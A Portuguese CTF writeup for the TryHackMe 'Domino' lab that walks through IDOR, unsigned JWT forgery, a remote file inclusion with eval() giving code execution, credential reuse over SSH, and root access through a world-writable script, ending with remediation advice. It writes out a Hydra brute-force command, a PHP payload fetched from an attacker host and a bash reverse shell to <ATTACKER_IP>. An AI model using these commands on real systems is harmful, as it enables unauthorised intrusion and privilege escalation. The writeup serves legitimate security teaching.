# TryHackMe — Domino (Web / CTF Writeup)

> **Disclaimer** — Writeup educacional de um laboratório controlado (TryHackMe). Flags foram substituídas por `<FLAG_N>` e IPs por `<TARGET_IP>` / `<ATTACKER_IP>`. Credenciais e segredos exibidos são específicos da instância do laboratório e não têm valor fora dele. **Não use estas técnicas em sistemas sem autorização explícita.**

---

## Sumário

- [Visão Geral](#-visão-geral)
- [Ferramentas](#-ferramentas)
- [Reconhecimento](#-reconhecimento)
- [Enumeração Web](#-enumeração-web)
- [Análise de Arquivos Estáticos](#-análise-de-arquivos-estáticos)
- [Flag 1 — IDOR](#-flag-1--idor)
- [Flag 2 — JWT Forgery](#-flag-2--jwt-forgery)
- [Flag 3 — RFI + eval() → RCE](#-flag-3--rfi--eval--rce)
- [Flag 4 — Reuso de Credencial → SSH](#-flag-4--reuso-de-credencial--ssh)
- [Flag 5 — Script World-Writable → Root](#-flag-5--script-world-writable--root)
- [Lições Aprendidas](#-lições-aprendidas)
- [Remediação](#-remediação)
- [Referências](#-referências)

---

## Visão Geral

**Domino** é um laboratório web que encadeia cinco vulnerabilidades clássicas até o comprometimento total do host. Cada flag abre a porta da próxima, num fluxo típico de pentest web:

> **enumeração → auth bypass → RCE → privesc lateral → privesc vertical**

| Flag | Onde estava | Vetor |
|:---:|---|---|
| **1** | `notes` de um usuário admin | IDOR em `/api/users/profile.php?id=` |
| **2** | Painel `/admin/` | JWT forjado (`role: admin`) |
| **3** | `/opt/flag3.txt` | RFI + `eval()` no `files.php` → RCE `www-data` |
| **4** | `/home/devops/flag4.txt` | Reuso de credencial (MySQL → SSH) |
| **5** | `/root/root.txt` | Script `774` executado por root → reverse shell |

---

## Ferramentas

| Ferramenta | Uso |
|---|---|
| `nmap` | Recon de portas e serviços |
| `gobuster` / `ffuf` | Enumeração de diretórios e brute-force |
| `hydra` | Brute-force de login HTTP POST |
| `curl` | Requisições manuais e PoCs |
| Burp Suite | Interceptação, Repeater, Intruder |
| `python3` | Forja de JWT, forge de cookie, decrypt AES |
| `pycryptodome` | Descriptografia AES-128-ECB |
| `ssh` | Acesso lateral como `devops` |
| `netcat` | Listener para reverse shell |

---

## Reconhecimento

### Scan de portas

```bash
nmap -sV -sC <TARGET_IP>
```

**Resultado:**

```text
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

> **Nota:** Apenas dois serviços expostos. O SSH será útil na fase de privesc lateral (Flag 4).

### Análise do site

`http://<TARGET_IP>:80` serve o portal **NexusCorp** com:

- Página de login (`index.php`)
- Forgot password (`forgot.php`)
- Our team (`team.php`) — lista nomes e e-mails de funcionários

> **Nota:** Os e-mails seguem o padrão `firstname.lastname@nexus.corp`, o que já nos dá uma lista de potenciais usernames:

1. `laura.hayes`
2. `michael.chen`
3. `robert.wilson`
4. `sarah.johnson`
5. `emma.taylor`
6. `david.brown`
7. `james.wright`

---

## Enumeração Web

### Descoberta de diretórios

```bash
gobuster dir -u http://<TARGET_IP>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt
```

**Resultado relevante:**

```text
403.php              (200)
admin                (301 → /admin/)
api                  (301 → /api/)
auth.php             (200, size 0)
backup               (301 → /backup/)
config.php           (200, size 0)
dashboard.php        (302 → /index.php)
forgot.php           (200)
index.php            (200)
javascript           (301 → /javascript/)
logout.php           (302 → /index.php)
server-status        (403)
static               (301 → /static/)
support              (301 → /support/)
team.php             (200)
```

### Análise de cada endpoint

| Endpoint | Comportamento |
|---|---|
| `/config.php` | Retorna vazio (executa PHP, não vaza código) |
| `/admin` | 404 → sem autenticação; só admin acessa |
| `/dashboard.php` | Redireciona para `index.php` se não logado |
| `/backup/` | Contém `README.txt` e `config.enc` |
| `/static/` | Contém `app.js` e `style.css` |
| `/support/` | Redireciona para login |
| `/team.php` | Lista pública de funcionários |

> **Nota:** Os diretórios `/backup/` e `/static/` são baixáveis — **sempre** baixe e leia arquivos estáticos: costumam ter chaves, endpoints e comentários de deploy.

---

## Análise de Arquivos Estáticos

```bash
wget http://<TARGET_IP>/backup/README.txt
wget http://<TARGET_IP>/backup/config.enc
wget http://<TARGET_IP>/static/app.js
```

### `README.txt`

```text
config.enc — Encrypted application configuration (AES-128-ECB)
Decryption key reference: see static/app.js (deployment notes)
```

### `app.js` (trecho)

```javascript
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    _backupKey: '<********?>',   // pad to 16 bytes
    appVersion: '*.*.*'
};
```

> 💡 **Nota:** Chave encontrada em arquivo estático público. A chave que deveria proteger o backup está no front-end, acessível a qualquer visitante.

### Descriptografia do `config.enc`

O `README.txt` indica **AES-128-ECB**. ECB é inseguro porque blocos iguais de plaintext geram blocos iguais de ciphertext — mas aqui o problema nem é o modo, é a **chave exposta**.

**Script Python:**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key  = b'<********?>'  # 16 bytes = AES-128
data = open('config.enc', 'rb').read()

cipher    = AES.new(key, AES.MODE_ECB)
plaintext = unpad(cipher.decrypt(data), 16)
print(plaintext.decode())
```

**Conteúdo decifrado:**

```json
{
  "app_name": "NexusCorp Portal",
  "version": "*.*.*",
  "deploy_env": "production",
  "system_user": "**++*"
}
```

> 🔎 O campo `system_user: ****` confirma um usuário do sistema chamado `****` — informação crucial para a **Flag 4**.

> **Nota:** `README`, `*.enc`, `*.bak`, `app.js` e `config.*` são fontes de ouro para credenciais. Sempre enumere `/backup/`, `/static/`, `/js/`, `/assets/` e baixe tudo.

### Brute-force de login

Com toda a informação coletada, foi feito brute-force de login com **Hydra**, usando a lista de usuários encontrada e o `rockyou.txt`:

```bash
hydra -L users -P rockyou.txt -s 80 <TARGET_IP> \
  http-post-form '/index.php:username=^USER^&password=^PASS^:F=Invalid credentials'
```

**Resultado:**

| Usuário | Senha |
|---|---|
| `laura.hayes` | *(vazio)* |
| `michael.chen` | *(vazio)* |
| `james.wright` | *(vazio)* |
| `david.brown` | *(vazio)* |
| `robert.wilson` | `********` |
| `emma.taylor` | `********` |
| `sarah.johnson` | `********` |

> **Observação:** Três contas com a **mesma senha** — sinal de política fraca.

---

## Flag 1 — IDOR

### Login e descoberta de endpoint

Após encontrar a senha, foi feito login na conta de `robert.wilson`, que expôs:

- **File Viewer** — `/api/files.php?name=`
- **File Viewer** — `/api/auth/token.php`
- **Quick Links** — Support Tickets, Open Ticket, My Profile API

Em **My Profile**, foi identificado o endpoint:

```text
/api/users/profile.php?id=4
```

> Após identificar esse endpoint, foram testados os valores do parâmetro `id` de `1` a `7` — correspondentes aos 7 usuários — via `curl`, para verificar IDOR.

```bash
curl -s "http://<TARGET_IP>/api/users/profile.php?id=1" \
  -H "Cookie: nexus_session=<COOKIE_DE_ROBERT>"
```

**Resultado:**

```json
{
  "id": 1,
  "username": "laura.hayes",
  "email": "laura.hayes@nexus.corp",
  "role": "admin",
  "notes": "<FLAG_1>"
}
```

> **Observação:** Vulnerabilidade **IDOR** confirmada. A Flag 1 foi obtida ao manipular o `id` para `1` (conta do admin `laura.hayes`). O controle de acesso não valida se o usuário autenticado tem permissão para acessar o recurso solicitado.

---

## Flag 2 — JWT Forgery

### Obter um token válido

O `files.php` exige JWT. O endpoint `/api/auth/token.php` emite tokens:

```bash
curl -s http://<TARGET_IP>/api/auth/token.php \
  -H "Content-Type: application/json" \
  -d '{"username":"robert.wilson","password":"******"}'
```

**Resultado:**

```json
{
  "token": "<JWT_DE_ROBERT>",
  "expires_in": 3600,
  "note": "Use this token as: Authorization: Bearer <token> for /api/files.php"
}
```

### Decodificar o JWT

Token analisado em [jwt.io](https://jwt.io):

**Header:**

```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload:**

```json
{
  "sub": "robert.wilson",
  "role": "user",
  "iat": 1793219124,
  "exp": 1793222724
}
```

### Forjar token admin

Como o servidor não valida a assinatura (ou aceita `fakesignature` como placeholder), basta alterar o payload e reencodar.

**Script Python:**

```python
import base64, json

def b64(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

header  = b64({"alg": "HS256", "typ": "JWT"})
payload = b64({"sub": "******", "role": "*******"})

print(f"{header}.{payload}.fakesignature")
```

### Acessar `/admin/`

```bash
curl -i http://<TARGET_IP>/admin/ -H "Authorization: Bearer <ADMIN_JWT>"
```

> **Observação:** O painel admin responde **200** — Flag 2 confirmada pelo acesso. A página exibe:

```text
File System Access
Internal document viewer via authenticated API.
GET /api/files.php?name=[path] with Bearer token
```

> JWTs são **stateless** — se o servidor não valida a assinatura (HS256 com segredo fraco, `alg: none`, ou sem verificação), o payload pode ser editado livremente. Sempre teste alterar `role`, `sub` e `user_id`.

---

## Flag 3 — RFI + `eval()` → RCE

> Utilizando o endpoint `/api/files.php?name=` com o JWT falsificado do admin, tentou-se ler `/etc/passwd`. A requisição foi bloqueada pela validação de caminho (`realpath()`), que restringe o acesso a `/var/www/html/`.

```bash
curl -i "http://<TARGET_IP>/api/files.php?name=../../etc/passwd" \
  -H "Authorization: Bearer <ADMIN_JWT>"
```

**Resultado:**

```json
{"error":"Access denied: path must be within /var/www/html/"}
```

### Lendo o código-fonte de `files.php`

Como o endpoint é um **viewer** (usa `file_get_contents`, não `include`), ao solicitar um `.php` o código-fonte é retornado em vez de executado:

```bash
curl -s "http://<TARGET_IP>/api/files.php?name=/var/www/html/api/files.php" \
  -H "Authorization: Bearer <ADMIN_JWT>"
```

**Trecho crucial:**

```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;                                 // ← sai AQUI
    }
    ob_start();
    eval(str_replace("<?php", "", $remote));  // ← RCE
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;                                     // ← sai AQUI
}

// Security check: resolve real path to prevent ../ traversal
$real = realpath($name);
if ($real === false || strpos($real, '/var/www/html/') !== 0) {
    http_response_code(403);
    echo json_encode(["error" => "Access denied: path must be within /var/www/html/"]);
    exit;
}
```

### Análise do fluxo

1. **RFI + `eval()` vem ANTES do filtro `realpath()`.** Se `$name` começa com `http://` ou `https://`, o código busca o conteúdo remoto e executa como PHP — e faz `exit` antes de chegar à validação de path.
2. `str_replace("<?php", "", $remote)` remove a tag. **O payload deve ser código PHP puro, sem `<?php`.**
3. `allow_url_fopen=On` (comentário do dev confirma) → `file_get_contents("http://...")` funciona.

### Preparação do payload

> O payload deve ser enviado **sem** a tag `<?php`, pois o script a remove antes de executar via `eval()`. Deve ser servido pela máquina local.

```bash
echo 'system("id; ls -la /opt; cat /opt/flag3.txt");' > payload.txt
```

**Servir na máquina local:**

> O servidor HTTP deve ser iniciado **no diretório onde o payload foi criado**, para que o arquivo seja servido corretamente ao alvo.

```bash
python3 -m http.server 8000
```

**Disparar o RFI:**

```bash
curl -s -H "Authorization: Bearer <ADMIN_JWT>" \
  "http://<TARGET_IP>/api/files.php?name=http://<ATTACKER_IP>:8000/payload.txt"
```

**Resultado:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
total 28
drwxrwxrwx  5 root     root     4096 ...
-rwxrwxrwx  1 root     root     1870 admin_bot.py     ← world-writable!
-rw-r--r--  1 www-data www-data   30 flag3.txt        ← 644, www-data lê
drwxr-xr-x  2 root     root     4096 monitoring
drwxr-xr-x  2 root     root     4096 tools
<FLAG_3>
```

> **Nota:** Sempre que encontrar um arquivo, tente lê-lo. Aqui o `admin_bot.py` é `777` (world-writable) e roda como root (veremos adiante); além disso, há um diretório `monitoring`.

---

## Flag 4 — Reuso de Credencial → SSH

> Para ler a Flag 4, a mesma técnica da Flag 3 foi tentada, mas a leitura foi bloqueada por permissão (`Permission denied`).

**Payload:**

```bash
echo 'system("cat /home/devops/flag4.txt 2>&1");' > payload.txt
```

**Resultado:**

```text
cat: /home/devops/flag4.txt: Permission denied
```

> O home do `devops` tem permissão `750` e a flag tem permissão `600` — ou seja, `www-data` não tem permissão de leitura. É necessária uma **escalada de privilégios**.

### Lendo `admin_bot.py`

> O arquivo possui permissão `777` → `www-data` pode lê-lo e escrevê-lo. Leitura:

**Payload:**

```bash
echo 'system("cat /opt/admin_bot.py");' > payload.txt
```

**Resultado:**

```python
DB_CONFIG = dict(host="localhost", database="nexusdb",
  user="app_user", password="*********", ...)
APP_SECRET = "******************"
```

> A senha `********` é literalmente `******`. O `system_user: *****` (do `config.enc`) já tinha aparecido. **Hipótese:** a senha do banco é a mesma do usuário do sistema.

### Tentativa via `su` — falha

Falha por **typeahead flush**: o `su` chama `tcflush()` e descarta a senha enviada por pipe.

```bash
echo '***********' | script -q -c "su devops -c 'cat /home/devops/flag4.txt'" /dev/null
# → su: Authentication failure  (por race condition, não por senha errada)
```

### Solução — SSH direto

```bash
ssh devops@<TARGET_IP>
```

**Ler a Flag 4:**

```bash
cat /home/devops/flag4.txt
```

---

## Flag 5 — Script World-Writable → Root

### Enumeração como `devops`

```bash
id                        # uid=1001(devops) — sem sudo, sem grupos extras
sudo -l                   # falha: devops não está em sudoers
find / -perm -4000 -type f 2>/dev/null   # apenas SUIDs padrão
find / -user root -writable -type f 2>/dev/null
```

**Saída relevante:**

```text
/opt/admin_bot.py
/opt/monitoring/health_report.sh
/var/log/nexus_health.log
```

### Análise do `health_report.sh`

```bash
ls -la /opt/monitoring/health_report.sh
# -rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
```

### Tentativa 1 — `cp` da flag (falhou)

```bash
cat > /opt/monitoring/health_report.sh <<'EOF'
#!/bin/bash
cp /root/root.txt /tmp/flag5 2>/dev/null
chmod 644 /tmp/flag5 2>/dev/null
EOF
```

### Tentativa 2 — Reverse shell (funcionou)

**Listener:**

```bash
nc -lvnp 4444
```

**Sobrescrever o script:**

```bash
cat > /opt/monitoring/health_report.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
EOF
```

**Ao conectar:**

```bash
cat /root/root.txt
# → <FLAG_5>
```

---

## Lições Aprendidas

- **IDOR** é trivial de explorar quando o backend confia cegamente no parâmetro `id`.
- **JWT** sem validação de assinatura = qualquer um vira admin.
- **Segredos em arquivos estáticos** (`app.js`, `config.enc`, `README.txt`) são a porta de entrada mais comum.
- **Ordem de execução** importa: um filtro `realpath()` **depois** do `eval()` é inútil.
- **Reuso de credencial** entre banco e sistema operacional é um multiplicador de impacto.
- **Scripts world-writable executados por root** são um caminho direto para root.

---

## Remediação

| Vulnerabilidade | Correção |
|---|---|
| IDOR | Validar autorização por objeto no backend (sessão → recurso) |
| JWT Forgery | Validar assinatura com segredo forte; rejeitar `alg: none`; nunca aceitar `fakesignature` |
| RFI + `eval()` | Nunca `eval()` em input externo; desabilitar `allow_url_fopen`/`allow_url_include`; whitelist de paths **antes** de qualquer I/O |
| Credencial reutilizada | Senhas únicas por serviço; usar cofre de segredos |
| Script world-writable | Permissões `750`/`700`; validar integridade; rodar como usuário dedicado |

---